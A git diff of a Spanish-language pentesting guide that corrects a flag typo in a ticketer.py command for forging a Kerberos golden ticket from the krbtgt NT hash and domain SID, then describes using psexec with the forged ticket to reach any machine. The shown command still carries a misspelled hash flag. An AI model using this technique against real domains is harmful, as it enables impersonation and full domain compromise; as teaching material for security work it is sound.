@@ -64,7 +64,7 @@ Para esto vamos a crear un archivo Administrador.ccache el cual se va a enviar p
 Usaremos la herramienta tiketer: 
 
 ```Python
-ticketer.py -ntmlhash {HASH_NT_del_usuario_krbtgt} -doamin-sid {SID_del_dominio} -domain {NOMBRE_DEL_DOMINIO} {USUARIO_QUE_QUEREMOS_IMPERSONALIZAR}
+ticketer.py -ntmlhash {HASH_NT_del_usuario_krbtgt} -domain-sid {SID_del_dominio} -domain {NOMBRE_DEL_DOMINIO} {USUARIO_QUE_QUEREMOS_IMPERSONALIZAR}
 ```
 
 Ahora, vamos a hacer una variable de entorno llamada KRB5CCNAME, la cual va a contener la ruta hacia el archivo Administrador.ccache, ahora vamos a usar psexec para conectarnos a cualquier maquina usando este ticket: 
